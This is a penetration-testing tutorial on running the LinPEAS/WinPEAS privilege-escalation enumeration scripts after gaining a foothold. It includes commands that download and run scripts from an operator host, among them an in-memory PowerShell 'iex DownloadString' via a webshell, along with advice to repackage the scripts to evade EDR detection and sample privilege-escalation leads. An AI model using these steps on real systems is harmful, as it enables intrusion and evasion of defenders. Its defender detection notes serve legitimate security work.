# LinPEAS / WinPEAS — full tutorial

The PEASS-ng (Privilege Escalation Awesome Scripts Suite) tools auto-enumerate everything that might lead to local privilege escalation — kernel version, SUIDs, capabilities, sudo rules, scheduled tasks, weak service ACLs, cleartext creds, AD CS templates, cloud metadata. **The first thing you run after foothold.**

## Install / run

```terminal
# Linux victim
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/peas.out

# Windows victim — pick variant
winPEASany.exe        # generic
winPEASx64.exe        # 64-bit
winPEAS.bat           # cmd-only
.\winPEAS.ps1         # PowerShell module
```

Run as the user you compromised — don't elevate first.

## Modes / flags

### LinPEAS

| Flag | Effect |
|------|--------|
| `-a` | All checks (default for engagement) |
| `-s` | Stealth (skip noisy file-system scans) |
| `-q` | Quiet (less output) |
| `-o <module>` | Only specific module (`Network`, `Files`, `Processes`...) |
| `-D` | Skip extra files / discovery (faster) |
| `-N` | Skip network checks |
| `-P <password>` | Sudo password (try `sudo -l` etc.) |
| `-W` | Wait for keypress between modules (interactive) |
| `--help` | List modules |

### WinPEAS

| Flag | Effect |
|------|--------|
| `domain` | AD enumeration |
| `notcolor` | Strip ANSI |
| `quiet` | Suppress banner |
| `nosearch` | Skip slow file searches |
| `searchfast` | Faster, less thorough |
| `wait` | Pause before each section |
| `applicationsinfo` | Installed apps |
| `processinfo` | Running processes |
| `serviceinfo` | Service ACLs |
| `userinfo` | User / group / privilege detail |
| `windowscreds` | Search for stored creds |
| `lolbas` | LOLBAS-relevant binaries |
| `cloudinfo` | Cloud metadata (AWS / Azure / GCP) |

## What gets flagged (color code)

- **Red/Yellow** = high probability of privesc.
- **Green** = informational.
- **Blue** = baseline / good.

LinPEAS has a "Probable PE" banner at the end summarizing best leads.

## Workflows

### Standard from a popped Linux shell

```terminal
wget http://operator:8000/lp.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
/tmp/lp.sh -a 2>&1 | tee /tmp/peas.txt
# Read peas.txt offline; look for red/yellow lines
```

### WinPEAS via webshell (no AV write)

```powershell
iex (New-Object Net.WebClient).DownloadString('http://op/winPEAS.ps1')
```

### Targeted modules only (faster)

```terminal
./linpeas.sh -o Software,Network,Container -q | tee peas.txt
```

## Good output highlights

```
[+] Vulnerable to CVE-2022-0847 (DirtyPipe)?
    YES — kernel 5.15.0 vulnerable.

[+] Looking for SUID files...
    /usr/bin/find    → see GTFOBins
    /tmp/secret.bin  → custom SUID binary, world-writable

[+] Sudo rules:
    User alice may run the following:
    (root) NOPASSWD: /usr/bin/python3 /opt/admin.py
        ↑ command-injection candidate

[+] Capabilities:
    /usr/bin/python3 = cap_setuid+ep   → setuid(0) trick
```

For Windows:

```
[!] Always-installed Elevated → MSI privesc possible
[!] AlwaysInstallElevated registry HKLM and HKCU = 1
[!] Service "BadService" — modifiable by Authenticated Users
[!] Unquoted service path: C:\Program Files\My App\service.exe
[!] AutoLogon credentials in registry
```

## Bad / problematic output and fixes

| Symptom | Fix |
|---------|-----|
| Tool exits early | Permission errors at `/proc/*/exe` — normal; outputs partial; that's OK |
| Output huge | `-D -q -s`; or use `-o` for one module |
| Color codes break terminal | `--no-color` (LinPEAS) / `notcolor` (WinPEAS) |
| Hangs on file search | `nosearch` (Win) / `-D` (Lin) |
| Missing kernel match | Old PEASS version | Re-download latest release |

## Defender's perspective

- Sysmon/Auditd: many `find / -perm -4000`, `getcap -r /`, `crontab -l`, `cat /etc/passwd`, `cat /etc/shadow`, `ldap` queries — characteristic LinPEAS pattern.
- Windows: bursts of WMI / ServiceController / registry reads from a single user session.

Detection ideas:
- Sigma rule: `linpeas.sh` filename in process create.
- Auditd rule on bursty `find` with `-perm -4000` predicate.

## OPSEC

- LinPEAS / WinPEAS are **noisy** (thousands of file checks). Use `-s -D` modes for stealth.
- Default scripts have known SHA-256 hashes that EDRs flag — repackage with random comments / variable renames.
- Better for high-stakes engagements: run targeted enum manually (`sudo -l`, `getcap -r /`, `find / -perm -4000`) instead of full PEAS.

## Related tools

| Tool | Niche |
|------|-------|
| **linux-exploit-suggester** | Kernel-LPE recommendations |
| **Seatbelt** (.NET) | Windows situational awareness, EDR-friendlier |
| **PowerUp** / **SharpUp** | Windows privesc audit |
| **les2** | Modern fork of LES |
| **deepce** | Container-specific PE checks |
| **PrivescCheck** | PowerShell Windows privesc checker |
